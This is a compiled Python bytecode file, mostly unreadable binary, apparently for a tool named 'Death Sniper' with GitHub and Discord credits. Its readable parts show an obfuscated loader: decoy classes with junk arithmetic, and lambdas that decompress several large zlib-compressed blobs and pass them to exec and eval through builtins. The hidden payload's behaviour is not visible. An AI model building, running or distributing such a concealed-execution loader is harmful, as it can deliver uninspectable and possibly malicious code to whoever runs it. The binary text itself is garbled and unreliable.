�
    �ǿe��  �                   �  � d dl T d dlmZ dZdZdZdZdZdZ	e
eeeeeef\  ZZZZZZZ G d� d�  �        Zed	k    �r�	 e�                    e	�
�  �          ed��  �        Zddk    r) ed��  �        �                    ej        dz  ��  �         n;ddk     r5e�                    dej        z   ��  �         e�                    dd��  �         e�                    dej        z  ��  �         e�                    dd��  �          ed��  �        �                    ej        dz  ��  �         e�                    dd��  �         e�                    ej        d z   ��  �         e�                    d!d"��  �          ed#��  �        �                    ej        d$z
  ��  �         d%� d&� d'� d(� d)� f\  Z Z!Z"Z#Z$ ed*��  �        �                    d+ej        z   ��  �           e#�   �          e$ e  e" e!d,�  �        �  �        �  �        e�%                    d�-�  �        e�%                    d�-�  �        z   e�%                    d�-�  �        z   e�%                    d!�-�  �        z   �  �        �  �         d4S # e&$ rkZ'd.d/k    r e�                     ee'�  �        �
�  �         n:d0d1k    r. ed2��  �        �                    ej        d3z
  ��  �         Y d4Z'['d4S Y d4Z'['d4S Y d4Z'['d4S d4Z'['ww xY wd4S )5�    )�*)�prodzDeath Sniperzhttps://github.com/Aspectisezhttps://discord.gg/deathsniperzprint("Death Sniper")c                   �\   � e Zd Zd� Zdd�Zdd�Zefd�Zdeefd�Z	e
fd	�Zed
� �   �         ZdS )�
_detectvarc                 �^   � t          |df�  �        | _        | �                    d��  �         d S )Ni�|  i� ��Add)�_memoryaccess�_divide�_frame)�self�	_builtinss     �omain.py�__init__z_detectvar.__init__   s0   � �$�i��%7�8�8�������������    Fc                 �2  � | xj         d|z
  z  c_         	 t          t          k    rt          t          t          f d S t          t
          t          ft          k     d S # t          $ r d� dt          iD �   �          Y d S  t          d�  �        t          k     Y d S xY w)NiV���c              3   �B   K  � | ]}t           t           t          f|fV � �d S �N)�While�	Substract��.0�Maths     r   �	<genexpr>z$_detectvar._frame.<locals>.<genexpr>   s.   � � � �V�V�4�u�e�Y�'��.�V�V�V�V�V�Vr   �6eghud6elyely5idg�8Y�f�
@)
r   �Squarer   r   �MemoryAccess�_callfunction�ArithmeticErrorr   �Product�bool)r   r	   s     r   r   z_detectvar._frame   s�   � �������$���	,�)/�&���U�E�9�%�%�%�%�|�]�\h�>i�mv�>v�>v�>v�>v��� 	W� 	W� 	W�V�V�<N�PT�;U�V�V�V�V�V�V�V�	,��N�#�#�t�+�+�+�+�+���s   �$A �A �B�:B��  c                 �4  � |dz  }| j         t          k     	 t          t          t          fr't          r t          t          t          fp	t           d S  d S d d S # t          $ r d� t          t
          iD �   �          Y d S  t          d�  �        t          k     Y d S xY w)Ni,u��.c              3   �B   K  � | ]}t           t          k     �|d |ifV � �dS )r   N)r   r   r   s     r   r   z#_detectvar.Floor.<locals>.<genexpr>+   s9   � � � �q�q�D�Ta�dp�Tp�Tp�d�'��.�/�Tp�Tp�Tp�Tp�q�qr   g�;�.>+�?)�	_absoluter!   r   r   �	TypeErrorr   r    �int)r   �	Algorithms     r   �Floorz_detectvar.Floor"   s�   � ��^�#�	���$���	*�MY�[h�jv�Lw�  Q�  }I�  Q�l�M�<�8�H�L�L�L�L�H�H�H�  OR�  OR�  OR�  OR��� 	r� 	r� 	r�q�q�\�4�<P�q�q�q�q�q�q�q�	*��M�"�"�c�)�)�)�)�)���s   �6A �A �A �"B�;Bc                 �*   � t          �   �         |          S r   )r   ��Powers    r   �Builtinsz_detectvar.Builtins0   s   � ��x�x���r   i6���c                 ��   � | |�   �         | <   	 d� t           t          t           fD �   �          d S # t          $ r d� t          t          iD �   �          Y d S  t          d�  �        dk     Y d S xY w)Nc              3   �,   K  � | ]}|t           i|fV � �d S r   )r   r   s     r   r   z'_detectvar.Calculate.<locals>.<genexpr>8   s+   � � � �[�[�t�t�U�m�T�"�[�[�[�[�[�[r   c              3   �b   K  � | ]*}t           t          k    �|t          t          t          ffV � �+d S r   )r   r   r   r   )r   �Modulos     r   r   z'_detectvar.Calculate.<locals>.<genexpr>;   s:   � � � �_�_�V�PV�Z^�P^�P^�f�u�e�Y�/�0�P^�P^�P^�P^�_�_r   i�4  T)r   r   �AttributeErrorr   r   r    )�Ceil�_add�
_algorithms      r   �	Calculatez_detectvar.Calculate3   s�   � �!�
�
���T��	+�[�[��m�\�/Z�[�[�[�[�[�[��� 	`� 	`� 	`�_�_��e�}�_�_�_�_�_�_�_�	+��M�"�"�d�*�*�*�*�*���s   �/ �"A+�A+c           
      �z   � t          t          t          t          t          | �  �        �  �        �  �        �  �        S r   )r   r   r1   r   r   ��codes    r   �executez_detectvar.execute@   s*   � ��T�&��y�$�)?�)?�"@�"@�A�A�B�B�Br   c                 �6   � d| _         | j         t          j        fS )Nz-<__main__.Power object at 0x000002268BE25660>)�_roundr   r%   )r   s    r   r%   z_detectvar._absoluteC   s   � �E�����Z�1�2�2r   N)F)r"   )�__name__�
__module__�__qualname__r   r   r)   r'   r-   r   r6   �strr:   �propertyr%   � r   r   r   r      s�   � � � � � �� � �,� ,� ,� ,�*� *� *� *� � � � � � (��&� +� +� +� +� � C� C� C� C� �3� 3� �X�3� 3� 3r   r   �__main__r8   i�>yO)r   iq� iӢ� i�S��i���r   i� i=B= i]���)r(   �O0O0oOo0OooO0OOooOo0o00O0s�	  x��}kw�F���>���3m�2E����bv�O[�vwo�=ݳj����p P���If��$�9I&�d�س���:y�n��s����	��VP 
$EI�vܐD��[U�n�WU]��}��U��p�^ㄹ<��q�I����|δ''^r�>x���+?bw�� r���$�$����do��@�a���k��G�!?�d���k:�Έ����?�O�{�ʕ$m_apy=f���mծ0j�����q��x �ba��u��a�"���Y�g͖ }�x7�b^����n����i��`��JcS�|�˃���F7te�� �ؓ�o�E0O->��Z�
?��A"Q�P�i�9gw_?�B�'�A��2@��;�!������#�{GPn���2�?��݆�Fq���^b�a������]߫���n���&����nm�u���pŐ��������^���~o��U{�~o�^��o�^TbS�������I�J/�?�>^<�o��7���^��!;ї��/A >�>�PW]�����_@�J�v�3���p��hv�vv|���7��k���������W�<��
��7�.�Q�%S�7�m��n�^�8���t���R��{	��.?�k#����0��������5twv�I|ox!ث�����)��aXN%�h����==���9�a��9������v>�l��g�ﳇ�㳇?(�EI�0��lͦ���0zvV.>~|�^(����{?(�%N��LX��ބ���D�/~`��΃���N���৿���}ƙ��a���ת��U�p��0KU�V_��r�T@�S�ڸѣ���&������wz��ټ��.����A�u9=v�f/)�\u��C"�.?5�p���ϔ�τ]��o@�n�F}'i����bȒ8A�7|4~�4�Nm�Yو�a�6:������8i��A#r�ވy҈�hm�I�H��o���F��ˮ��yE6 ��Q_�?��s�+a�[1����м�G���n���c� �;Q��Ε~�}0<[l��;���|��$���A���>�x�E�(} -r���f Z� V��o���zx'3�U��d�m�.2
+��P��QF���=k���ﳱ 1���"��Wq�7P,��x}��(���������a��2x��~=7�q���*�Ã*I��%<J��Oɫ;��i0��AfJ�S����:�|��VS`
�F*�N��0�OE��;Q�լFVe>��
�d[�,��a�H��Rj�U)u����P�A ��S���;�m0g0hw�~�	�8���61�!|'�i���O�SW��L}�';�<�)�7n4���O�_d�����PLx����K�Q��l"���ƌ8ɐ �~�6�n��A�;h�c�SͪC�#��0a��c,��}��1��Y$5;N�u�����o�l{������ϛ�)Lbz��9j/��Z�5ۉ�H����]5 �z�Ϯ�}h�s 7��"/腶�2(?3"L��D�U��RaU2:���,��1��;�ǻ0�X&�7�����I�p.r�����(2t���3'1�)�fs'F����/;���{����l��{����n�1�{&L]�m�\�@�b@��$<�$*۳dM������B�NH��Dj�	[� ��wڲրL �P]�R�pG�7����;�~:_[�SgUעa@��{󱪽ɏsq�QХba�FR�z9�r�Գ�-wQ�81�p�1����E8�m1����$⼉�v}f]���&�-`�(�]-�FC&��8}�ݾKLh����f��]w#��ug>�.�J&y���wQk���2/fc�K�P�f𱗌��O�-��
E'z=E���D�T��$�.s���ml]�}�;�3Y=.�y��3��K�8@-}�{5�S��[�7������c�����|�VV�ɟg��4��++����͆���d_ � ���t���ְ���B'�X�Î���W��~�}�s�`Pc���V��J�ǣ	4��^'�Ŧ�,�B(�/�~�:�LMYw#U�}~W<*��+��0
fN� ;�1�t�pԉ<W���(�L��-��!��a���@���qSg�,�fE;���{2�Q5v795�*e�5���k�O�����B �)��'����|VHxq��`�a!���ҳ�O�a��B�Rm�H����ǐ�z(�J����� r�(�SfE»A���]$:���P*� 1���,�
 &�1w3K� �M�f����[��~�n �t\����i�<v�!��5q�t��b S��,F^c��Ӱ3<�ab[T�p`-���'��̜&~��OP@�u�M֯���u��rm����[G�2��3��Y�q���	&.�����*��ϓ�ȲL++_������4MD;����6U�~����[�@n �I��G��)r3   r4   i+����nnmnmnmmmnnmnnnnnmmns�	  ̉���D2%�����Q� P�S�i��$�P	�K���%�G%\a�,���tATA>��m���o�i�|i���$;�U3o��kV5 <�=��VM����*>�W���pg��֑�k767�o����^��� �x8��G�ynQ��v]�v��'7���S�H�E\�,�`��Ё���f䞁��Tݿ�^��P�9HB9L�<��c#��M��{�˱�c�%�"�Of3֗��1t.���L	{:����)5W��	Fn���6�Q;��� ��ѿe@2���a`��4���\`u��%Xg��b4��Gk�G|$9�0�{���/��z�	��-��`�I] /�LN�y}�Dn�=�{!�a����Z2� �W��M M�C�3V �v=�}p�D�kv��5��Y���گ��{��՚�&��륪��[�#^'��ܷؖ�%�B���P�&	��;�Qլ��KB��qJ����_VOу�C7��p1�L:�Ҧ�ZLg�weB'Dۑ̜ e5�J��ϒҮجY�/�'oE�k}�E^	k�(�d]�]�Uԥ�[,�VĽqo���<�a8��(ط�L��qJ�Q̡��+B&��
7�\̡���:ڲ~[Uc^r���_��[y���Rf(����i�^�҈�2.���q�D���I��Y��'q�7L���t�J�eI��6��434�Ї��d�H]&��x?<�F����LP�3:?�j~�	�\N(�IJ�9̰�wi��'j:���
<�t��e/��5�E%�J�����	��=7�KkЙ߅0�����\�����z�G���-�T{]�I��㈆��@B�ZJ�UMcf�%ܩ_������:�7�*a�;<�[��יxG��;l)>(��P$�h����'ʋ`R�P��t���(k�t�U~�.?7�B�o��w�?������N��N�3�c���y�����-�B��&Q|�� _�>�V�,+��#o$J�e�w5����!gJ�Ń����\�[�r�����,[n+Όv�&T�|EY��� ���o~/���U[Y�óS���J�`y/ju�e���b�1�'��Q������� �����`T�"�1L�B	�Yh�v�%�|�@�:�y=���1mZ,�XF@l�n��;a^���J�/J	I Zv��6�e#��N�!�;�'`HT�"F��`À����!��-8c��,��l=_�q�^Q��z�Mx�n�D��f�6Mh,Ns��2H��s���`(XWs̇����@�C8�`�iP��Y��
r�^m�_����y�����a�pBo:w�U�4	��E��YT�9yN�5�:̱�0r��"���|GR�!�uyo�|���[]w���9�d�~=:2M.-�q�oA�v��G�)�+������6qu<Z.<�����lӗ��-0yV����d���/Wf徱�X��҅.�!I�ӣwe� ���]�#p��f��:'��:|�Ɖ��	噾�>�NY1K��7����1%������;��a����,%��WU!eC�Kϒf��B�I)��1��C1�����&�nX9"IiDE$SX� �<��X-�;^�*NK9>ˡ��I�����	=T���t��j`aL�d0�U�p���x*J&�k�,��a���a�z>�
�H*�B����%�^�
�Y�*b�r�g�=�^K$�St�߮��跢�:[[+օ�V[��Z1MtLk��e�2	�A�z0��xצ��`;}�U����'���*��.�dj=X�͖�QP���HQ��J
� �Z�	E��	��G����iU��X� ��sS��r��I�{5E��0�FR�<=�(#�e��:W��p'��Q�qu$	�I(���uF2�� ����G=�����jv+��(xe�"��b!�1��	��1�1�	!ő��MMVԖA��+ȳ�@��� ����̽o 6B=GT�����[(�� 1�~ʘ!)�Ș��^V���I�����͛7>\ݨ�V�B�5���j��[�o����o߹{���,��Ow>����=~�+Ow�}��,��������B��WGZH�յ�����_���_���GYB��55j??��dx|r:���?����o���?��O����_����_��b�kӿ:�k�_�����O���of9��9���ߚ���ߙ���/�o��ӿ?��8���?����?�r����No�Ϧ�|���1���5���3���7����0��Z��4����2����6���N�h�ߧ�c�?��k���?����ƚ���ui9t�4K�!@���y��s�A�(�0:#6`��X�CȲ&�k���ܒ�����ډ�9i�wV�.G�g
堿�B�ɫBO^C_󚄯��_F<����T�IZ���kt��-⤝�Vm����6'z
E��T_��:�[B���70��?�D��a��L$�&{l�����w�C iv����ODOoooDDOoODDoODDDOOos�	  "B�	$��"��ߓ0��8��I� $5_���1��"�	�pM��-Y�aTyڴ�M��R;�&�K�y�œ�7N���^�Q�C�~��^;RZ������gHo��A�e���RU�)#��WO4r����/%fg�2�%�HutC]Ğ'榰�`$iv��
<I��i���xC\3�IT�C[ Z�,�B����,kFD���g�������u�>��2�/��oe��3Օ} ��x$���"��y�:D������9Ec���I���u�~�8&p�?К�M�I��`�v�p���5k�+��lA�{:����A�̻7�6�y�ǛK��^sv��q1��!!;`SL�Q�)���R�1��i䭒�B� ��o��\���u�J�i�63Nx�0�D(�\H��"C����ꖂ���mBe�0��:���?�:~y���G/O�[w_�v����ի��������}��q�ѯ����]L�<�[[���r<�xtkEr��M�H���4�����WG&{/�0��̻e�"5g�#�I�����㧕2��.�N:�˜�����9����ы��q���������ngt��VN� �v�S7Y��N8�n����G;�>��˧�1RL����m���0�ru.���`Z�Mv��R&�>�!O�kk�����kw�t=[�8�6J��%G6�Б�ݏ�
�-;����jL��F��������n�̗�d���T'sQ���;�,�9Cvlw��~�2���Y�\�p����ŗ�	2<�E��CυG���%z���ǓM4�~���<�z#�GZ��+oȨPҩQb�!��!�aO�w�z�*e\6)E|:�"A��ƥ	P�__��h��Ct�RC����}���@�#��~Hк�z�o{����� �诨C�JG[X�Q[�E �:��N�$i�\�Qo���EL�<N�����6e������w>޽���;�~��4[���g��f@�b�f�]m1��P�Yd��>�������-`�i���c\W�8�Q[B��WK�b|A�iye�ym��6�%��/�;A/4!4��4�㷇޼F�Mp%���A<��R��qa*��|�v���KaK�A�
gqx��N��V@��Zt�M�C�EC���SOțB��������>��`��d��]�D%��za��t�xc�J�6օ�dM�:ꎊX��� P��:/�fI�#<9�Coˀ�����,��x�1�5ŋT04�#U�V�8�y@焗ս��^ B�����,���d�0��\+�1jk>�[z���o)�3\C�(�-�0̬�޽y���u\�sI��o�CR}��L!L�hY�u����6�r	U�·LH%�1�6����X�)�
A/�*�EϞ��r��k�U�=��� d:���Z�l�b��Ki}^e��Ki �#�7�ȅ�/4C��̶���~�ͥ���lK ź<fT���q$|+���<�� �DA��:��{.g	����΁K�_�>`N��-���b�9-P�GX�@t1���+*�y��Qþ0��K�FH]�����M4��/�)?�����VˋM0��P�M��F��<�����y�яiR���Z�R;��{�I�b� m�ڳ�
e�yʁ���ݤ��Ey�N�����H�=��M;�d�ˋ3vtQf��m�ݒ2U�3�Ԧ-��=	���&�(/�
�+/LP���Ƶ]�H8�1��Ou���gv�l&%齨Z��"򭢏�\�/^)��Y����	еU0Z�j��<��oF�b���������OC��ѻ��o]�\?��w��9��z�]/�}'j�pª�Tj$�<�{-S`m{��=@=T�K3]��[@E1����o�'��E��ck�황�P&-K��Y������a�=t�{�JCU�/�m�'�++�Czͪx���c$�ɗx�oe�8`��y��&L�Y���Ptprr�@Ծ��>)� �Í�o�_��U�ހ�3�)0�Oj\n��8϶�=f��`�c �`��A��h&�z�N�:�e��{2�Vs��q�+r����[�K9�RF�xU�v[��� n[d��-,�%tqɢ���}����ji��bJ��C4�qmvqW��?���
�b�>�E܊��E���BD�Y %n�B.�) ���7��yV�餬(虜
<g�_]��.e���H�ʈ;⽈ǇB3��7����{��� ���7�d3We�Co0�����\��s�ڍ�ު�f�U�>�i�{_�	|/��I�x]�Řי�1KUKR���K�����G.g�Lȴr��/���ë��M��ڊ�Qn_��\m���0�2���o���a������Y����)h�q� ^�I�y$-a�ކ���S�wa�ըL��9�I���e}k��Q��h�e���-�;~�`�I��n�Ay�+i���jw���;��Q��k��YĈi����nnnmmmmmnmnmmmmmmns!  ����M+��r-�6�<$�TL�Rm�k0\mKe�t�_�X��ZD�;���Ѡ�IR/�Y3y�g��qE��YLU������6f�-�� d�ѐ����}�G;n	Ft�$Ĕ�p<��!����c�q�e8��&~\��La����R����^EƦ���Z֓ǻϪ�&�I�Y�(f�6�Bw�M�qA5�c~T
�N���eΒN9�8���l4�����52i�ȭɅ���k�Ů��W3����L��b#��%�գ�f;uI�Iz�v,:�`K��h���󺸃��#��D�|��P����
h�U�mV�f��G��y��6fd���s�^Ɏ��R�[Z�����x��A����/�y�v?�$}���bھW�g��))Q�?�S�gY�R���^x����Br�C:+V��4_�dT�IW�s �r��\�L�@*�! ��EL��Wt��(��^Y��J�3�1<G����G���)���u^)���JU���2�~�2셮rV�ٳ��F6���wg��s9$�~�3�~-�����Ԇ��^����Zc�����U%�f�����d��1��J�p��h��bbƒ��������颍~�y�r��Omi�ɘ�F�4+p3{�K��S-���{;S6x��;o���|fu�O8�C���HV��4��d4��En6�8	�!���PIo�>�.�\&�(�c���S���#��K]}a�����iCR��eG��4�frXu�9M��[mi��[J�Б;s(-_������_K�P���$�������UzVe������\�rN���.�i��jS.5��yM�K���#�p3��J'���/��Fe1.�'p&4ئ��/~N+�NF�#�A�I�>�VOvHU���v�a����d�e���G�8E�z*Y8e����S-��} CZ���8�1�Yb���G����6�@#��Ւ>�Y�����Ծ�&U�AT��'�[s Ҙe��x-hI��5א���v�*f��X�������}�*���H�i���T�*��1P�c�����LSW��-۴�DG���L)[��g�Y��I��cس{k:n�.�W����[�x�����(��M��z_Es����L�>G��&�s��,����K��,}��j���)/L,ۋ}`J�J�G�K��Ӓn�� ���b�����vaV�i�B+Q���E���]+*�f���[�\L��o�;
�V�~��IZ���m!�Z�"i�F��U��"BJ~�M�J��m����^�b�.���=�V�1�Y�2�"�sҞ��FE��)+��Y�_�(n(<�>��	��F�eۏg�6Z%!�)��fZ�7S!�+)�Q_�G��;����:�-���,^�v��FK �Z�|��Z����º�샮�.�BB�ʭ7��3t[�.F��+�q�s��x�Qq�L
���i�x�O��z=K�U׏ʪ_1��(ų!W.��6Ǿz6�>���Y�"=g��*�=7�!�bg�®��	�_���-q�{�{Nqǘ�u���c ����x�� �F�� �����b�\d���L� ���Z�Qlm)�?*���q��k�rs��1�ѧ��rK��pq��pN%�'�b��������&��Ǹ\$SD=]�t� _�g-��;�����%�WTUՋ�>}����ݴV;7�v��-��ˬ��o�I���0 ߦ�1%WOi��NUz7s4�7�|�T2��=`��p�ܯ`�[�VXy{(�7)&!�V s���ď�'�EK��l��c��(/�Nƹ��5�6i��Z�M�:��b��?q��2i_�  i��  c                 �   � | d         S )N�
decompressrB   ��llIIlIIlllIIIllIllIlllIIls    r   �<lambda>rL   X   s   � �  c|�  }g�  ch� r   c                 �   �  t          �   �         d          t          �   �         d          t          �   �         d         d�  �        dd��  �        �  �        S �N�eval�compiler@   z8globals()['\x65\x76\x61\x6c'](llIIlIIlllIIIllIllIlllIIl)�LIIIJLIJLJIJILIJJLJILIIL)�filename�mode��globalsrJ   s    r   rL   rL   X   s�   � �  L	i	�  L	S	�  L	U	�  L	U	�  V	h	�  L	i	�  j	S
�  j	q	�  j	s	�  j	s	�  t	R
�  j	S
�  T
m
�  T
[
�  T
]
�  T
]
�  ^
l
�  T
m
�  n
�  T
@�  T
@�  Jl�  rD�  j	E�  j	E�  j	E�  L	F�  L	F� r   c                 �2   �  | t          d�  �        �  �        S )N�zlib)�
__import__rJ   s    r   rL   rL   X   s<   � �  jC�  jC�  DN�  Oa�  Db�  Db�  jc�  jc� r   c                  �   �  d� d�  �        S )Nc                 �   �  t          �   �         d          t          �   �         d          t          �   �         d         d�  �        dd��  �        �  �        S rN   rT   rJ   s    r   rL   z<lambda>.<locals>.<lambda>X   s�   � �  Ol�  OV�  OX�  OX�  Yk�  Ol�  mV�  mt�  mv�  mv�  wU�  mV�  Wp�  W^�  W`�  W`�  ao�  Wp�  qB�  WC�  WC�  Mo�  uG�  mH�  mH�  mH�  OI�  OI� r   z__import__('builtins').execrB   rB   r   r   rL   rL   X   s.   � �  nI�  nI�  nI�  Ky�  mz�  mz� r   c                 �   �  | |�  �        S r   rB   )�SSSSS2S22SSS22S2SS2SS222SrK   s     r   rL   rL   X   s'   � �  xQ�  xQ�  Rk�  xl�  xl� r   l������ iy�  �varsr+   i� i]�) i�� i��~ g�:���iDb  N)(�builtins�mathr   r
   �__obfuscator__�__authors__�
__github__�__discord__�__license__�__code__�execr@   �tuple�map�ordrU   �typer   r   r1   r   r   r   r    r   r=   r:   �StackOverflowr   r   r)   r6   �SSS222S2SSS2222222S2�xwxwwxwxwwxwxwxwx�nnnnnnnmnmmmnmmmnnnmnnmm�SS2S222S2SS2222S2222S�SSSSS2SS22SS22SS2SSSSr-   �	Exceptionr   rB   r   r   �<module>rr      s�  �� � � � � &� &� &� &� &� &�  ����+�
�.����"�� BF�s�E�SV�X[�]d�fj�Aj� >��t�V�U�I�v�w�63� 63� 63� 63� 63� 63� 63� 63�p �z���_����(��+�+�+�"�
��?�?�?���G����J�?�3�3�3�:�:��AV�Y_�A_�:�`�`�`�`��g������F�]�5J�,J��K�K�K�  GQ�  G[�  G[�  a|�  BIw�  G[�  GJw�  GJw�  GJw������0E�(E��F�F�F�  BL�  BV�  BV�  \r�  xZv�  BV�  B[v�  B[v�  B[v��
�~�.�.�.�5�5�M�<Q�TZ�<Z�5�[�[�[�  Wa�  Wk�  Wk�  qH�  N~v�  Wk�  Wv�  Wv�  Wv����=�#8�6�#A��B�B�B�  ~H�  ~R�  ~R�  Xl�  rfW�  ~R�  ~gW�  ~gW�  ~gW��
�}�-�-�-�4�4�=�;P�SX�;X�4�Y�Y�Y�  Bh�  Bh�  kF�  kF�  Ic�  Ic�  fz�  fz�  }l�  }l�  Am�  U@�  Ui�  j{�  |T�  Uj�  k@��
�~�.�.�.�4�4���I^�A^�4�_�_�_�  [r�  [p�  [p�  [r�  [r�  sH�  sH�  I]�  I]�  ^v�  ^v�  wH�  wH�  I[�  w\�  w\�  ^]�  ^]�  I^�  I^�  _i�  _r�  _r�  yT�  _r�  _U�  _U�  V`�  Vi�  Vi�  pF	�  Vi�  VG	�  VG	�  _G	�  H	R	�  H	[	�  H	[	�  b	y	�  H	[	�  H	z	�  H	z	�  _z	�  {	E
�  {	N
�  {	N
�  U
i
�  {	N
�  {	j
�  {	j
�  _j
�  sk
�  sk
�  [l
�  [l
�  [l
�  [l
�  [l
��� _� _� _��G������d�d�<�&8�&8��9�9�9�9��g����J�>�2�2�2�9�9��@U�X]�@]�9�^�^�^�^�^�^�^�^�^� ������ :�9�9�9�9�9�����_����' �s   �H(I' �'K�,AK�K